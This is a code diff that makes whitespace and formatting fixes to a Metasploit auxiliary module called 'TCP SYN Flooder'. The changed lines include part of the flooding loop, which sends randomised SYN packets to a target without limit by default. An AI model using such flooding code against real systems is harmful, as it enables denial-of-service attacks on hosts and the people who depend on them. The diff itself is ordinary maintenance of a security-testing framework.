@@ -9,10 +9,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'TCP SYN Flooder',
+      'Name' => 'TCP SYN Flooder',
       'Description' => 'A simple TCP SYN flooder',
-      'Author'      => 'kris katterjohn',
-      'License'     => MSF_LICENSE
+      'Author' => 'kris katterjohn',
+      'License' => MSF_LICENSE
     )
 
     register_options([
@@ -22,11 +22,11 @@ class MetasploitModule < Msf::Auxiliary
       OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])
     ])
 
-    deregister_options('FILTER','PCAPFILE')
+    deregister_options('FILTER', 'PCAPFILE')
   end
 
   def sport
-    datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
+    datastore['SPORT'].to_i.zero? ? rand(65535) + 1 : datastore['SPORT'].to_i
   end
 
   def rport
@@ -52,12 +52,13 @@ class MetasploitModule < Msf::Auxiliary
     p.tcp_flags.syn = 1
 
     while (num <= 0) or (sent < num)
-      p.ip_ttl = rand(128)+128
-      p.tcp_win = rand(4096)+1
+      p.ip_ttl = rand(128) + 128
+      p.tcp_win = rand(4096) + 1
       p.tcp_sport = sport
       p.tcp_seq = rand(0x100000000)
       p.recalc
-      break unless capture_sendto(p,rhost)
+      break unless capture_sendto(p, rhost)
+
       sent += 1
     end
 
